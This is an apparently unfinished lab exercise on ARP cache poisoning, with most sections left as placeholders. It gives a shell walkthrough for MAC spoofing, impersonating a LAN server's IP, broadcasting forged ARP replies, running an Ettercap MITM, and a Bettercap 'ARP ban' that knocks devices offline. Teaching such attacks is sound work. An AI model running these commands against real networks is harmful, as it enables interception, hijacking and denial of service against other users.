# Performing an ARP Cache Poisoning attack

In this exercise we will pretend to be a machine on the LAN that we are not by lying about the IP address we were given by the LAN's DHCP server. This will enable us to arbitrarily redirect local network traffic to any machine we wish, including ourselves, such that we can perform network-based Denial-of-Service (DOS) or Machine-in-the-Middle (MITM) attacks. We will accomplish this by exploiting the lack of peer authentication in the Address Resolution Protocol (ARP), which maps an ethernet device's MAC address to its IP address.

Essentially, we will be performing an *ARP spoofing* attack. As this behavior is relatively conspicuous, we will also cover the basics of *MAC address spoofing*, which will assign a fake hardware address to the NIC you will use to emit spoofed ARP replies to the network. This combination of MAC and ARP spoofing enables you to masquerade as any other device on the local network segment.

# Contents

1. [Objectives](#objectives)
1. [Bill of materials](#bill-of-materials)
1. [Prerequisites](#prerequisites)
1. [Set up](#set-up)
1. [Practice](#practice)
    1. [Introduction](#introduction)
1. [Defenses](#defenses)
1. [Discussion](#discussion)
1. [Additional references](#additional-references)

# Objectives

> :construction: TK-TODO

# Bill of materials

> :construction: TK-TODO

# Prerequisites

> :construction: TK-TODO

# Set up

> :construction: TK-TODO

# Practice

> :construction: TK-TODO

## Introduction

> :construction: TK-TODO

## :construction: TK-TODO

A demo of performing an ARP cache poisoning attack.

Don't forget to spoof your own hardware address first:

* [SimpleSpoofMAC](https://github.com/meitar/SimpleSpoofMAC)

```sh
# Some assumptions for this demo:
VICTIM_IP=192.168.9.10
VICTIM_mDNS=server.local
INTERFACE=en0

# Make a temporary directory to store our spoofed site.
mkdir /tmp/hijack
cd !$ # Go there.

# Place an `index.html` file in the directory that will be the
# HTTP server's document root.
echo "Expecting a local server? Surprise! It's been hijacked by an ARP cache poisoning attack." > index.html

# Start an HTTP server on port 8000 (the default).
python3 -m http.server &

# Become a `sudo`'er so that we can bind to privileged ports.
su admin

# Redirect port 80 traffic to our HTTP server on localhost.
sudo socat TCP4-LISTEN:80,reuseaddr,fork TCP:127.0.0.1:8000

# Find the IP address of the device we are going to impersonate.
dns-sd -G v4 $VICTIM_mDNS # Resolve (via mDNS) the server's domain name.
# GNU/Linux users will probably want to do:
#avahi-resolve --name -4 $VICTIM_mDNS

# Alias our own NIC to the IP address that we want to masquerade as.
# NOTE: This is not necessary for an MITM, since we just need to pass
# traffic back and forth between our two targets. However, as this is
# demos a *hijack* rather than an MITM, we need to respond *as* the
# target instead of passing traffic *to* the target.
sudo ifconfig $INTERFACE ${VICTIM_IP}/24 alias
# GNU/Linux users will probably want to do this instead:
#ip address add ${VICTIM_IP}/24 dev $INTERFACE

# Now that we know the server's IP address, let's note its MAC address.
# If it responds to ICMP echo requests, `ping` will show us output:
ping $VICTIM_IP

# If it doesn't, we can do an ARP scan instead. There are many tools, but I
# like using `nmap`; its `-sn` option will do only a host discovery scan.
sudo nmap -sn -PR $VICTIM_IP # Note `-PR` is default, so can be omitted.

# An alternative tool that provides more output is `arp-scan`.
arp-scan $VICTIM_IP

# We can also use the `arping` utility for a more surgical approach:
sudo arping -c 1 -i $INTERFACE $VICTIM_IP

# We should now have an entry in our local ARP table ("ARP cache"):
arp -n $VICTIM_IP
# GNU/Linux users will probably want to do this instead:
#ip neighbour show $VICTIM_IP

# To actually perform the attack (i.e., to lie about the MAC-to-IP
# mapping to the network), we can configure our attack machine to
# respond to ARP requests for the victim IP address with our own
# NIC's MAC address. This will not *necessarily* work due to the fact
# that the legitimate answer may come after our own, overriding it.
sudo arp -s $VICTIM_IP auto pub only ifscope $INTERFACE

# NOTE: This is only currently easy on true UNIX, like BSD. Attempts
# to publish a Proxy ARP entry on GNU/Linux requires a kernel tunable
# (`net.ipv4.conf.${INTERFACE}.proxy_arp`) and proper routing tables.
# If you really want to attempt this as a GNU/Linux user, you will
# ulimately want to invoke a command such as the following after setting
# up your IP routing tables appropriately. ("Appropriately" means what?)
# Some guidance at http://linux-ip.net/html/tools-ip-neighbor.html
#sudo arp -Ds $VICTIM_IP $INTERFACE pub

# To improve the liklihood of successfully poisoning the target's ARP cache,
# we want to continuously broadcast the wrong information, repeatedly.
# The "wrong information" means an ARP packet whose payload contains:
#
# * The `Sender MAC address` field set to the MAC address of the attacker.
# * The `Sender IP address` field set to the IP address of the target.
# * The `Target MAC address` field set to the broadcast MAC address.
# * The `Target IP address` field set to 0.0.0.0.
#
# This should be sent as an ARP reply (opcode `0x02`).
#
# What this does is tell devices that the IP address of the target is
# associated with the MAC address of the attacker; hence, ARP spoofing.

# One way we could construct such an ARP packet manually is like so:
sudo arping -i $INTERFACE -U -P -S $VICTIM_IP 0.0.0.0

# More simply, we can just use the `arpspoof` tool:
arpspoof $VICTIM_IP
```

> :construction: TK-TODO: This whole section is still just notes.
> 
> Automate portions of the above with tooling. Ettercap and Bettercap are the famous tools for this:
> 
> * Old demo of Ettercap's `remote_browser` plugin:
>     1. Make sure you have an appropriately configured `etter.conf`:
>         * Set `ec_uid` and `ec_gid` to user ID and group ID number you want Ettercap to become, e.g., `ec_uid = 1001`
>         * Set `remote_browser` to a command that makes sense, such as opening your Web browser, e.g., `remote_browser = "open http://%host%url"`
>     1. Launch Ettercap in `--text` interface mode, performing an ARP MITM attack that also snarfs packets bound for remote networks (`--mitm arp:remote`) with the `--plugin` for the `remote_browser` activated and a chosen target:
>         ```sh
>         # Targets are specified as `[MAC address]/[IPv4 range]/[IPv6 range]/[port range]`
>         # The three delimiting slashes are required, the values are not. A missing value means "any."
>         # If `ettercap` complains about the "wrong number" of slashes (`/`), you may have
>         # a copy that does not have IPv6 support. See `ettercap -h | grep ^TARGET` to check target syntax.
>         sudo ettercap --text --quiet --mitm arp:remote --plugin remote_browser /192.168.9.10// /192.168.2.1//80
>         ```
> * Quick demo of Bettercap's "ARP ban" (spoofs the gateway's MAC address) that knocks a device off the LAN:
>     1. Launch `bettercap` with `sudo bettercap`
>     1. Find a target: `net.show`
>     1. Set the target (otherwise, entire subnet is the target): `set arp.spoof.targets 192.168.9.10-50`
>     1. Activate the ARP ban hammer: `arp.ban on`
>     1. End the attack: `arp.ban off`

# Discussion

> :construction: TK-TODO

# Additional references

> :construction: TK-TODO
